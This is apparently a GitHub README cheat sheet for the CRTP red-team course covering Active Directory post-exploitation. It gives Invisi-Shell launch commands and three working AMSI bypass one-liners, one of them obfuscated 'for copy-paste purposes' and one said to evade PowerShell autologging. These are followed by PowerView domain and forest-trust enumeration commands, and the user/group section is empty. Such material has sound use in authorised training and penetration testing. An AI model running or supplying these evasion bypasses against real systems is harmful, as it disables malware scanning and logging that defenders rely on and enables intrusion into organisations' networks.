# CRTP_Skid
Commands and reference material useful for the CRTP course and Active Directory post-exploitation.

- [CRTP AD Attacks](#CRTP-Skid)
  - [Shell Prep & Defense Evasion](#Shell-Prep-&-Defense-Evasion)  
    - [Invisi-Shell](#Invisi-Shell)
    - [AMSI Bypass](#AMSI-Bypass)
  - [Domain Enumeration](#Domain-Enumeration)  
    - [Powerview](#Powerview)
      - [Domain](#Domain-Enum)
      - - [Domain Trust](#Domain-Trust)
      - [Users Groups Computers](#Users,-Groups,-&-Computers)
    - [AD PowerShell Module](#Active-Directory-PowerShell-Module)

## Shell Prep & Defense Evasion

### [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell)
Invisi-Shell is used in the labs to bypass PowerShell security features by hooking .NET assemblies. Invisi-Shell a batch file for execution (two batch files dependant on current privilege level) that reference the invisi-shell DLL. Note - Invisi-shell may break certain functionality of certain programs run within shell.
```powershell
C:\Path\RunWithRegistryNonAdmin.bat 
C:\Path\RunWithPathAsAdmin.bat
```
### AMSI Bypass 
More AMSI Bypass techniques [here](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)

#### ‘Plain’ AMSI bypass example:
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
#### Obfuscation example for copy-paste purposes:
```powershell
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
#### Another bypass, which is not detected by PowerShell autologging:
```powershell
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```
## Domain Enumeration 
### Powerview 
Powerview is referenced quite a bit in the course material, but the Microsoft-signed AD PowerShell Module can also be used and will typically evade AV sigs where PowerView may not if using an unmodified version. 

#### Domain Enum

```powershell 
Get-NetDomain
Get-NetDomain -Domain <domainname>
Get-DomainSID
Get-DomainPolicy (Get-DomainPolicy)."System Access" net accounts
```
#### Domain Trust

```powershell 
Get-NetDomainTrust
Get-NetForest
Get-NetForestDomain
Get-NetforestDomain -Forest <domain name>
Get-NetForestCatalog
Get-NetForestCatalog -Forest <domain name>
Get-NetForestTrust
Get-NetForestTrust -Forest <domain name>
Get-NetForestDomain -Verbose | Get-NetDomainTrust
```
#### Users, Groups, & Computers
```powershell 
```

#### Active Directory PowerShell Module
[Microsofts AD PowerShell](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) module can also be used for domain enumeration. 
